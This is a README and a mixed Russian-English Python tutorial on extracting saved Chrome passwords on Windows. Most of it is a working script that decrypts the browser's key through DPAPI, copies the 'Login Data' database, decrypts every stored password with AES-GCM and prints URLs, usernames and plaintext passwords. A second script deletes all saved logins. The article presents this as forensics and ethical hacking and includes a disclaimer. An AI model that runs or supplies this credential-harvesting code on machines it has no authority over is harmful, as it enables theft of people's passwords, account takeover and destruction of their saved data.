# [How to Extract Chrome Passwords in Python](https://www.thepythoncode.com/article/extract-chrome-passwords-python)
To run this:
- `pip3 install -r requirements.txt`
- To extract Chrome passwords on Windows, run:
    ```
    python chromepass.py
    ```
- To delete saved passwords on Chrome:
    ```
    python delete_chromepass.py
    ```
##
# [[] / []]()
Извлечение сохраненных паролей в самом популярном браузере является полезной и удобной криминалистической задачей, так как Chrome сохраняет пароли локально в базе данных SQLite. Однако это может занять много времени при выполнении этого вручную.

Поскольку Chrome сохраняет большую часть ваших данных о просмотре локально на вашем диске, в этом руководстве мы напишем код Python для извлечения сохраненных паролей в Chrome на вашем компьютере с Windows. Мы также сделаем быстрый скрипт, чтобы защитить себя от таких атак.

Связанные с: Создание 24 этических хакерских скриптов и инструментов с помощью Python EBook

Чтобы начать работу, давайте установим необходимые библиотеки:

pip3 install pycryptodome pypiwin32
Откройте новый файл Python и импортируйте необходимые модули:

import os
import json
import base64
import sqlite3
import win32crypt
from Crypto.Cipher import AES
import shutil
from datetime import timezone, datetime, timedelta
Прежде чем перейти непосредственно к извлечению паролей Chrome, нам нужно определить некоторые полезные функции, которые помогут нам в основной функции:

def get_chrome_datetime(chromedate):
    """Return a `datetime.datetime` object from a chrome format datetime
    Since `chromedate` is formatted as the number of microseconds since January, 1601"""
    return datetime(1601, 1, 1) + timedelta(microseconds=chromedate)

def get_encryption_key():
    local_state_path = os.path.join(os.environ["USERPROFILE"],
                                    "AppData", "Local", "Google", "Chrome",
                                    "User Data", "Local State")
    with open(local_state_path, "r", encoding="utf-8") as f:
        local_state = f.read()
        local_state = json.loads(local_state)

    # decode the encryption key from Base64
    key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    # remove DPAPI str
    key = key[5:]
    # return decrypted key that was originally encrypted
    # using a session key derived from current user's logon credentials
    # doc: http://timgolden.me.uk/pywin32-docs/win32crypt.html
    return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]

def decrypt_password(password, key):
    try:
        # get the initialization vector
        iv = password[3:15]
        password = password[15:]
        # generate cipher
        cipher = AES.new(key, AES.MODE_GCM, iv)
        # decrypt password
        return cipher.decrypt(password)[:-16].decode()
    except:
        try:
            return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
        except:
            # not supported
            return ""
Get: Build 24 Ethical Hacking Scripts & Tools with Python EBook

get_chrome_datetime() function is responsible for converting chrome date format into a human-readable date-time format.

get_encryption_key() function extracts and decodes the AES key that was used to encrypt the passwords that are stored in the "%USERPROFILE%\AppData\Local\Google\Chrome\User Data\Local State" path as a JSON file.

decrypt_password() takes the encrypted password and the AES key as arguments and returns a decrypted version of the password.

Below is the main function:

def main():
    # get the AES key
    key = get_encryption_key()
    # local sqlite Chrome database path
    db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
                            "Google", "Chrome", "User Data", "default", "Login Data")
    # copy the file to another location
    # as the database will be locked if chrome is currently running
    filename = "ChromeData.db"
    shutil.copyfile(db_path, filename)
    # connect to the database
    db = sqlite3.connect(filename)
    cursor = db.cursor()
    # `logins` table has the data we need
    cursor.execute("select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins order by date_created")
    # iterate over all rows
    for row in cursor.fetchall():
        origin_url = row[0]
        action_url = row[1]
        username = row[2]
        password = decrypt_password(row[3], key)
        date_created = row[4]
        date_last_used = row[5]        
        if username or password:
            print(f"Origin URL: {origin_url}")
            print(f"Action URL: {action_url}")
            print(f"Username: {username}")
            print(f"Password: {password}")
        else:
            continue
        if date_created != 86400000000 and date_created:
            print(f"Creation date: {str(get_chrome_datetime(date_created))}")
        if date_last_used != 86400000000 and date_last_used:
            print(f"Last Used: {str(get_chrome_datetime(date_last_used))}")
        print("="*50)
    cursor.close()
    db.close()
    try:
        # try to remove the copied db file
        os.remove(filename)
    except:
        pass
Related: How to Make a Password Generator in Python.

First, we get the encryption key using the previously defined get_encryption_key() function, then we copy the SQLite database (located at "%USERPROFILE%\AppData\Local\Google\Chrome\User Data\default\Login Data" that has the saved passwords to the current directory and connects to it; this is because the original database file will be locked when Chrome is currently running.

After that, we make a select query to the logins table and iterate over all login rows. We also decrypt each password and reformat the date_created and date_last_used date times to a more human-readable format.

Finally, we print the credentials and remove the database copy from the current directory.

Let's call the main function:

if __name__ == "__main__":
    main()
The output should be something like this format (obviously, I'm sharing fake credentials):

Origin URL: https://accounts.google.com/SignUp
Action URL: ttps://accounts.google.com/SignUp
Username: email@gmail.com
Password: rU91aQktOuqVzeq
Creation date: 2020-05-25 07:50:41.416711
Last Used: 2020-05-25 07:50:41.416711
==================================================
Origin URL: https://cutt.ly/register
Action URL: https://cutt.ly/register
Username: email@example.com
Password: AfE9P2o5f5U
Creation date: 2020-07-13 08:31:25.142499
Last Used: 2020-07-13 09:46:24.375584
==================================================
Great, now you're aware that a lot of sensitive information is in your machine and is easily readable using scripts like this one.

Disclaimer: Please run this script on your machine or on a machine you have permission to access. We do not take any responsibility for any misuse.

Related: How to Use MySQL Database in Python.

Deleting Passwords
As you just saw, saved passwords on Chrome are quite dangerous to leave them there. Now you're maybe wondering how we can protect ourselves from malicious scripts like this. In this section, we will write a script to access that database and delete all rows from logins table:

import sqlite3
import os

db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
                            "Google", "Chrome", "User Data", "default", "Login Data")
db = sqlite3.connect(db_path)
cursor = db.cursor()
# `logins` table has the data we need
cursor.execute("select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins order by date_created")
n_logins = len(cursor.fetchall())
print(f"Deleting a total of {n_logins} logins...")
cursor.execute("delete from logins")
cursor.connection.commit()
Для этого вам потребуется закрыть браузер Chrome, а затем запустить его. Вот мой вывод:

Deleting a total of 204 logins...
Как только вы откроете Chrome на этот раз, вы заметите, что автозаполнение форм входа больше не существует. Запустите и первый скрипт, и вы заметите, что он ничего не выводит, поэтому мы успешно защитили себя от этого!

Заключение
В этом учебнике вы узнали, как написать скрипт Python для извлечения паролей Chrome в Windows, а также удалить их, чтобы предотвратить доступ злоумышленников к ним.

Обратите внимание, что в этом уроке мы говорили только о файле «Данные входа», который содержит учетные данные для входа. Я приглашаю вас изучить этот каталог более подробно.

Если вы хотите извлечь файлы cookie Chrome, этот учебник проведет вас через извлечение и расшифровку файлов cookie Chrome аналогичным образом.

Например, есть файл «История», в котором есть все посещенные URL-адреса и поиск по ключевым словам с кучей других метаданных. Существуют также «Cookies», «Media History», «Preferences», «QuotaManager», «Reporting and NEL», «Shortcuts», «Top Sites» и «Web Data».

Это все базы данных SQLite, к которым можно получить доступ. Убедитесь, что вы сделали копию, а затем открыли базу данных, чтобы не закрывать Chrome всякий раз, когда захотите получить к ней доступ.